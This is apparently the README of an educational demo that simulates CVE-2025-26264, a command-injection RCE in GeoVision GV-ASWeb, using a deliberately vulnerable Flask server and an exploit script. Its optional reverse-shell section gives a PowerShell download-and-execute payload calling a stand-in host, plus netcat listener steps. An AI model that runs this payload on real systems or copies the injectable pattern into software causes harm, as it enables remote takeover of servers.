# 🚨 CVE-2025-26264 - Simulated Remote Code Execution via Notification Settings (Flask Demo)

This project demonstrates a simulated version of **CVE-2025-26264**, a real-world authenticated Remote Code Execution (RCE) vulnerability found in **GeoVision GV-ASWeb ≤ v6.1.2.0**.

In this demo, an attacker abuses a poorly handled "notification settings" input field to execute arbitrary PowerShell commands on the server.

---

## 🛠️ Technologies

- Python 3
- Flask
- PowerShell (assumed Windows host)

---

## 📁 Files

- `app.py` — Vulnerable Flask server
- `exploit.py` — Exploit script to trigger the vulnerability
- `README.md` — This documentation

---

## 🚀 Running the Vulnerable Server

1. Install dependencies:
   ```bash
   pip install flask
   ```

2. Start the vulnerable Flask app:
   ```bash
   python app.py
   ```

   Server runs at: `http://localhost:8080`

---

## 💥 Exploit

Use the `exploit.py` script to send a malicious PowerShell command:

```bash
python exploit.py
```

This script sends a POST request to the vulnerable `/notification` endpoint with a `message` field like:

```powershell
Start-Process notepad.exe
```

On a real system, this would launch Notepad on the server.

---

## 🧪 Reverse Shell Example (Optional)

If testing locally and safely, modify the payload in `exploit.py` like so:

```python
payload = 'powershell -NoP -NonI -W Hidden -Command "IEX(New-Object Net.WebClient).DownloadString('http://YOUR_IP:8000/shell.ps1')"'
```

Then:

1. Create `shell.ps1` with reverse shell code.
2. Host it:
   ```bash
   python3 -m http.server 8000
   ```
3. Start listener:
   ```bash
   nc -lvnp 4444
   ```

---

## 🛡️ Mitigation

- **Never execute user input** without strict validation or sandboxing.
- **Avoid `os.system()`** or shell-invoking functions with dynamic input.
- **Use allowlists** for commands if needed.
- **Patch vulnerable systems** — in the real CVE, upgrading GV-ASWeb to ≥ v6.2.0 mitigates the issue.
